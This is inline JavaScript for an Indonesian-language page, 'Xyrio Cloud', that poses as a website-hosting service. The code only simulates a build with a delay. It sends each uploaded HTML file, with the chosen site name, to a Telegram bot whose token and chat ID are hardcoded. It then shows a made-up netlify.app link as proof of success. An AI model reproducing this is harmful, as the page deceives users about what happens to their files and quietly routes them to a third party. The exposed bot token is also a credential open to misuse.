// Inline JavaScript
// DOM Elements
        const websiteForm = document.getElementById('websiteForm');
        const websiteNameInput = document.getElementById('websiteName');
        const htmlFileInput = document.getElementById('htmlFile');
        const fileButton = document.getElementById('fileButton');
        const fileDropArea = document.getElementById('fileDropArea');
        const fileNameSpan = document.getElementById('fileName');
        const createButton = document.getElementById('createButton');
        const successPopup = document.getElementById('successPopup');
        const popupClose = document.getElementById('popupClose');
        const websiteUrl = document.getElementById('websiteUrl');
        const urlWebsiteName = document.getElementById('urlWebsiteName');
        const copyButton = document.getElementById('copyButton');
        const newWebsiteButton = document.getElementById('newWebsiteButton');
        const notification = document.getElementById('notification');

        // Bot Telegram
        const BOT_TOKEN = '8352237832:AAHHUI6vFhST6sNpsMO8cGwDnpr9hMPO2co';
        const CHAT_ID = '7446889039';

        // File upload
        fileButton.addEventListener('click', () => htmlFileInput.click());
        fileDropArea.addEventListener('click', () => htmlFileInput.click());

        htmlFileInput.addEventListener('change', function() {
            if (this.files.length > 0) {
                const file = this.files[0];
                fileNameSpan.textContent = file.name;
                fileNameSpan.style.color = '#10b981';
                fileNameSpan.innerHTML = `<i class="fas fa-check-circle" style="color: #10b981; margin-right: 5px;"></i>${file.name}`;
            }
        });

        // Form submission
        websiteForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            const websiteName = websiteNameInput.value.trim();
            const file = htmlFileInput.files[0];

            if (!websiteName || !file) {
                showNotification('Harap lengkapi semua field', 'error');
                return;
            }

            // Validasi nama website
            if (!/^[a-z0-9-]+$/.test(websiteName)) {
                showNotification('Nama website hanya boleh huruf kecil, angka, dan tanda hubung', 'error');
                return;
            }

            // Loading state
            const originalText = createButton.innerHTML;
            createButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memproses...';
            createButton.disabled = true;

            try {
                // Simulasi proses
                await new Promise(resolve => setTimeout(resolve, 1500));

                // Kirim ke Telegram
                await sendToTelegram(websiteName, file);

                // Tampilkan popup sukses
                generateWebsiteLink(websiteName);
                successPopup.style.display = 'flex';
                showNotification('Website berhasil dibuat!', 'success');

                // Reset form
                websiteForm.reset();
                fileNameSpan.innerHTML = 'Belum ada file dipilih';
                fileNameSpan.style.color = 'rgba(255, 255, 255, 0.7)';

            } catch (error) {
                console.error('Error:', error);
                showNotification('Terjadi kesalahan, coba lagi', 'error');
            } finally {
                createButton.innerHTML = originalText;
                createButton.disabled = false;
            }
        });

        // Fungsi kirim ke Telegram
        async function sendToTelegram(websiteName, file) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', file);
            formData.append('caption', `Website: ${websiteName}\nDari Xyrio Cloud`);

            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData
            });

            if (!response.ok) throw new Error('Gagal mengirim');
            return response.json();
        }

        // Generate website link
        function generateWebsiteLink(name) {
            const formatted = name.toLowerCase().replace(/[^a-z0-9-]/g, '-');
            urlWebsiteName.textContent = formatted;
            const link = `https://${formatted}.netlify.app/`;
            websiteUrl.textContent = link;
            websiteUrl.dataset.link = link;
        }

        // Copy link
        copyButton.addEventListener('click', async function() {
            const link = websiteUrl.dataset.link;
            try {
                await navigator.clipboard.writeText(link);
                showNotification('Link berhasil disalin ke clipboard!', 'success');
                this.innerHTML = '<i class="fas fa-check"></i> Tersalin';
                this.classList.add('copied');
                setTimeout(() => {
                    this.innerHTML = '<i class="fas fa-copy"></i> Salin Link';
                    this.classList.remove('copied');
                }, 2000);
            } catch (err) {
                showNotification('Gagal menyalin link', 'error');
            }
        });

        // Buat website baru
        newWebsiteButton.addEventListener('click', function() {
            successPopup.style.display = 'none';
            websiteNameInput.focus();
            window.scrollTo({ top: 0, behavior: 'smooth' });
        });

        // Tutup popup
        popupClose.addEventListener('click', function() {
            successPopup.style.display = 'none';
        });

        // Tutup popup saat klik di luar
        successPopup.addEventListener('click', function(e) {
            if (e.target === this) this.style.display = 'none';
        });

        // Tampilkan notifikasi
        function showNotification(message, type) {
            notification.textContent = message;
            notification.className = `notification ${type}`;
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }

        // Keyboard shortcut: Ctrl+Enter untuk submit
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'Enter') {
                websiteForm.requestSubmit();
            }
            
            // Escape untuk tutup popup
            if (e.key === 'Escape') {
                successPopup.style.display = 'none';
            }
        });

        // Animasi tambahan saat hover tombol
        document.querySelectorAll('.file-button, .create-button, .popup-button').forEach(button => {
            button.addEventListener('mouseenter', function() {
                this.style.transform = 'translateY(-3px)';
            });
            
            button.addEventListener('mouseleave', function() {
                this.style.transform = 'translateY(0)';
            });
        });

        // Tambahkan klik otomatis ke link website di popup
        websiteUrl.addEventListener('click', function() {
            const link = this.dataset.link;
            if (link && link !== '#') {
                window.open(link, '_blank');
            }
        });

        // Jadikan website link bisa diklik
        websiteUrl.style.cursor = 'pointer';
        websiteUrl.title = 'Klik untuk membuka website';

